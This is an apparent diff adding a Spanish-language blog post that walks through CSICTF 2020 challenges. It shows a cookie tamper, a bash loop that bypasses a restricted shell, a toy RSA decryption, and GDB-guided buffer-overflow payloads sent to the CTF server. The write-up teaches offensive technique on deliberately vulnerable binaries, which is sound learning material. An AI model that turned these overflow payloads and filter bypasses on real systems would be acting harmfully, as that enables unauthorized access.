@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="xxmeshxx">
+
+
+
+
+
+<title>CSICTF 2020 - Team{ No_Ones } | xxmeshxx</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">xxmeshxx</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/category">Categorias</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">xxmeshxx</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/category">Categorias</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+    <meta http-equiv=”Content-Type” content=”text/html; charset=UTF-8″ />
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">CSICTF 2020 - Team{ No_Ones }</h1>
+            
+                <div class="post-meta">
+                    <!--
+                        Author: <a itemprop="author" rel="author" href="/">xxmeshxx</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">mayo 8, 2020&nbsp;&nbsp;22:13:35</a>
+                        </span>
+                    -->
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="CSICTF"><a href="#CSICTF" class="headerlink" title="CSICTF"></a>CSICTF</h1><p>Evento patrocinado por Bugsee, TryHackMe, Scf y Voiceflow, muy entretenido ;D.</p>
+<p>Aquí algunos retos que pude realizar. </p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Oreo"><a href="#Oreo" class="headerlink" title="Oreo"></a>Oreo</h3><p>“My nephew is a fussy eater and is only willing to eat chocolate oreo. Any other flavour and he throws a tantrum.”</p>
+<p><a href="http://chall.csivit.com:30243" target="_blank" rel="noopener">http://chall.csivit.com:30243</a></p>
+<p>Nada extraño, el reto tenia una cookie con la palabra “strawberry” codificada en URL y Base64 simplemente la cambie por “Oreo”<br>pero no funcionó, sin embargo al cambiarlo a “chocolate” la flag fue mostrada.<br><img src="../csictf/oreo.png" alt=""></p>
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="AKA"><a href="#AKA" class="headerlink" title="AKA"></a>AKA</h3><p>Cows are following me everywhere I go. Help, I’m trapped!</p>
+<p>nc chall.csivit.com 30611</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ nc chall.csivit.com <span class="number">30611</span></span><br><span class="line">user @ csictf: $ </span><br><span class="line">ls</span><br><span class="line"> ________________________________________</span><br><span class="line">/ Don<span class="string">'t look at me, I'</span>m just here to say \</span><br><span class="line">\ moo.                                   /</span><br><span class="line"> ----------------------------------------</span><br><span class="line">        \   ^__^</span><br><span class="line">         \  (oo)\_______</span><br><span class="line">            (__)\       )\/\</span><br><span class="line">                ||----w |</span><br><span class="line">                ||     ||</span><br><span class="line">user @ csictf: $</span><br></pre></td></tr></table></figure>
+<p>Este era un Reto el cual al conectarse era una vaquita que solo dice “moo” al poner comandos como ls, cat , pwd etc.<br>Suponiendo que esta realizando una validación de los comandos pero no de Bash hicimos lo siguiente:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user @ csictf: $ </span><br><span class="line"><span class="keyword">while</span> read line; <span class="keyword">do</span> echo $line; done &lt; flag.txt   </span><br><span class="line">csictf&#123;<span class="number">1_4</span>m_cl4rk3_k3nt&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Little-RSA"><a href="#Little-RSA" class="headerlink" title="Little RSA"></a>Little RSA</h3><p>The flag.zip contains the flag I am looking for but it is password protected. The password is the encrypted message which has to be correctly decrypted so I can useit to open the zip file. I tried using RSA but the zip doesn’t open by it. Can you help me get the flag please?</p>
+<p>Files: a.txt flag.zip</p>
+<p>Aqui daban 2 archivos, un zip que tenia una contraseña y un archivo a.txt que tenia esto:<br>c=32949<br>n=64741<br>e=42667</p>
+<p>Utilizando una herramienta llamada RsaCtfTool pude realizar el reto </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python RsaCtfTool -n <span class="number">64741</span> -e <span class="number">42667</span> --uncipher <span class="number">32949</span></span><br></pre></td></tr></table></figure>
+<p>La contraseña era <code>18429</code>:<br>y la flag: csictf{gr34t_m1nds_th1nk_4l1ke}</p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="pwn-intended-0x1"><a href="#pwn-intended-0x1" class="headerlink" title="pwn intended 0x1"></a>pwn intended 0x1</h3><p>Normalmente cuando hago un reto de pwn sigo estos pasos:<br>-Hacer un file: Para saber que tipo de binario es.<br>-Ejecutarlo: Para saber que hace.<br>-Strings: Luego muestra la contraseña o la flag.<br>-Pasarle muchas letras: Esto debido a que la mayoria de los retos de pwn son BufferOverflow y esperamos como respuesta un <code>Segmentation Fault</code><br>-Revisar que controles tiene: Canary, RELO etc.<br>-Debuguearlo: Para ir paso a paso que hace.</p>
+<p>Este era uno de los casos en el que la bandera salia haciendo esas pruebas. Al pasarle 200 A’s el programa pasaba por Buffer Overflow y trataba de hacer un cat a flag.txt la prueba fue echa en mi maquina pero al hacerlo en el servidor mostraba la flag.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># python -c "print('A'*200)" | ./pwn-intended-0x1</span><br><span class="line">Please pour me some coffee:</span><br><span class="line"></span><br><span class="line">Thanks!</span><br><span class="line"></span><br><span class="line">Oh no, you spilled some coffee on the floor! Use the flag to clean it.</span><br><span class="line">cat: flag.txt: No such file or directory</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn-intended-0x2"><a href="#pwn-intended-0x2" class="headerlink" title="pwn intended 0x2"></a>pwn intended 0x2</h3><p>Entramos en las ligas pesadas y este era un caso en el cual no daban el codigo del binario. Al vuelo era un ELF de 64 lo ejecute y de igual manera le pase muchas A’s.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># python -c "print('A'*200)" | ./pwn-intended-0x2</span><br><span class="line">Welcome to csictf! Where are you headed?</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">Safe Journey!</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
+<p>No nos dio la flag por lo que decide abrirlo con GDB, revisando la función <code>main</code> hace una comparación de lo que inserte el usuario con <code>0xcafebabe</code> y muestra algo mediante puts… pero si no es correcto, sale del programa. Ahora al hacer la prueba nos dio <code>Segmentation fault</code>y eso es por que el binario utiliza <code>gets</code> una función vulnerable de C. Por lo que podriamos aprovecharnos de gets y sobreescribir la variable local que esta en <code>rbp-0x4</code> con la que esta comparando ;D. </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000000401156</span> &lt;+<span class="number">0</span>&gt;:	push   rbp</span><br><span class="line">  <span class="number">0x0000000000401157</span> &lt;+<span class="number">1</span>&gt;:	mov    rbp,rsp</span><br><span class="line">  <span class="number">0x000000000040115a</span> &lt;+<span class="number">4</span>&gt;:	sub    rsp,<span class="number">0x30</span></span><br><span class="line">  <span class="number">0x000000000040115e</span> &lt;+<span class="number">8</span>&gt;:	mov    DWORD PTR [rbp-<span class="number">0x4</span>],<span class="number">0x0</span></span><br><span class="line">  0x0000000000401165 &lt;+15&gt;:	mov    rax,QWORD PTR [rip+0x2ef4]        # 0x404060 &lt;stdout@@GLIBC_2.2.5&gt;</span><br><span class="line">  <span class="number">0x000000000040116c</span> &lt;+<span class="number">22</span>&gt;:	mov    esi,<span class="number">0x0</span></span><br><span class="line">                   .....LINEAS QUE NO INTERESAN...........</span><br><span class="line">  <span class="number">0x00000000004011b9</span> &lt;+<span class="number">99</span>&gt;:	call   <span class="number">0x401060</span> &lt;gets<span class="meta">@plt</span>&gt;</span><br><span class="line">  0x00000000004011be &lt;+104&gt;:	lea    rdi,[rip+0xe6c]        # 0x402031</span><br><span class="line">  <span class="number">0x00000000004011c5</span> &lt;+<span class="number">111</span>&gt;:	call   <span class="number">0x401030</span> &lt;puts<span class="meta">@plt</span>&gt;</span><br><span class="line">  <span class="number">0x00000000004011c5</span> &lt;+<span class="number">111</span>&gt;:	call   <span class="number">0x401030</span> &lt;puts<span class="meta">@plt</span>&gt;</span><br><span class="line">  <span class="number">0x00000000004011ca</span> &lt;+<span class="number">116</span>&gt;:	cmp    DWORD PTR [rbp-<span class="number">0x4</span>],<span class="number">0xcafebabe</span></span><br><span class="line">  <span class="number">0x00000000004011d1</span> &lt;+<span class="number">123</span>&gt;:	jne    <span class="number">0x4011f0</span> &lt;main+<span class="number">154</span>&gt;</span><br><span class="line">  0x00000000004011d3 &lt;+125&gt;:	lea    rdi,[rip+0xe66]        # 0x402040</span><br><span class="line">  <span class="number">0x00000000004011da</span> &lt;+<span class="number">132</span>&gt;:	call   <span class="number">0x401030</span> &lt;puts<span class="meta">@plt</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>Aqui les enseño un truco de LiveOverflow:<br>El utiliza hooks para poder mostrar registros en tiempo de ejecución, esto es importante por que al entrar a un frame de cada función podemos tener control de los datos que se llenan en la PILA(Stack).</p>
+<p>Primero se ponen breakpoints donde se hace la asignación de la variable local y en donde realiza la comparación.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b *<span class="number">0x00000000004011ca</span></span><br><span class="line">gdb-peda$ b *<span class="number">0x000000000040115e</span></span><br></pre></td></tr></table></figure>
+
+<p>Despues definimos el hook:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ define hook-stop</span><br><span class="line">Type commands <span class="keyword">for</span> definition of <span class="string">"hook-stop"</span>.</span><br><span class="line">End with a line saying just <span class="string">"end"</span>.</span><br><span class="line">&gt;x/24wx <span class="variable">$rsp</span></span><br><span class="line">&gt;end</span><br><span class="line">`</span><br></pre></td></tr></table></figure>
+<p>Ejecuto el programa con el comando &gt; r en GDB. y reviso las salidas.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffdef0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x7fffffffdf00:	0x00401200	0x00000000	0x00401070	0x00000000</span><br><span class="line">0x7fffffffdf10:	0xffffe000	0x00007fff	0x00000000	0x00000000</span><br><span class="line">0x7fffffffdf20:	0x00401200	0x00000000	0xf7e13e0b	0x00007fff</span><br><span class="line">0x7fffffffdf30:	0x00000000	0x00000000	0xffffe008	0x00007fff</span><br><span class="line">0x7fffffffdf40:	0x00040000	0x00000001	0x00401156	0x00000000</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x000000000040115e <span class="keyword">in</span> main ()</span><br></pre></td></tr></table></figure>
+
+<p>Como veran la pila se ve limpia no tiene nada pero ahora si quiero saber cuanto debo sobreescribir necesito un patron eso se hace con el comando <code>cyclic</code>viene en pwntools cuando se instala.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cyclic 200</span></span><br></pre></td></tr></table></figure>
+<p>Continuo con el programa con el comando &gt; c en GDB y le paso el patron o payload.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">Welcome to csictf! Where are you headed?</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">Safe Journey!</span><br><span class="line">0x7fffffffdef0:	0x61616161	0x61616162	0x61616163	0x61616164</span><br><span class="line">0x7fffffffdf00:	0x61616165	0x61616166	0x61616167	0x61616168</span><br><span class="line">0x7fffffffdf10:	0x61616169	0x6161616a	0x6161616b	0x6161616c</span><br><span class="line">0x7fffffffdf20:	0x6161616d	0x6161616e	0x6161616f	0x61616170</span><br><span class="line">0x7fffffffdf30:	0x61616171	0x61616172	0x61616173	0x61616174</span><br><span class="line">0x7fffffffdf40:	0x61616175	0x61616176	0x61616177	0x61616178</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x00000000004011ca <span class="keyword">in</span> main ()</span><br></pre></td></tr></table></figure>
+<p>Reviso la pila para ver que tiene, esto lo hace automaticamente el hook que definimos. Como recordaran la variable local se encuentra alojada en <code>rbp-0x4</code>, por lo tanto …….</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/wx <span class="variable">$rbp</span>-0x4</span><br><span class="line">0x7fffffffdf1c:	0x6161616c</span><br></pre></td></tr></table></figure>
+<p>Con el mismo cyclic reviso el offset de ese valor.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cyclic -l 0x6161616c</span></span><br><span class="line">44</span><br></pre></td></tr></table></figure>
+
+<p>Vientos son 44 -&gt; eso quiere decir que a debo rellenar la pila con 44 valores basura y despues con 0xcafebabe para que suelte la flag.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"from pwn import *;print('A'*44 + p64(0xcafebabe))"</span> | nc chall.csivit.com 30007</span><br><span class="line">Welcome to csictf! Where are you headed?</span><br><span class="line">Safe Journey!</span><br><span class="line">You<span class="string">'ve reached your destination, here'</span>s a flag!</span><br><span class="line">csictf&#123;c4n_y0u_re4lly_telep0rt?&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn-intended-0x3-Incoming-…"><a href="#pwn-intended-0x3-Incoming-…" class="headerlink" title="pwn intended 0x3 {Incoming …..}"></a>pwn intended 0x3 {Incoming …..}</h3>
+        </div>
+<!--
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>xxmeshxx</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="httpd://xxmeshx.github.io/2020/05/08/csictf/">httpd://xxmeshx.github.io/2020/05/08/csictf/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                 -->
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/05/08/owasp2020/">OWASP 2020 - Writeup (Dr. Strange xD) Team - The Avengers</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© xxmeshxx | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
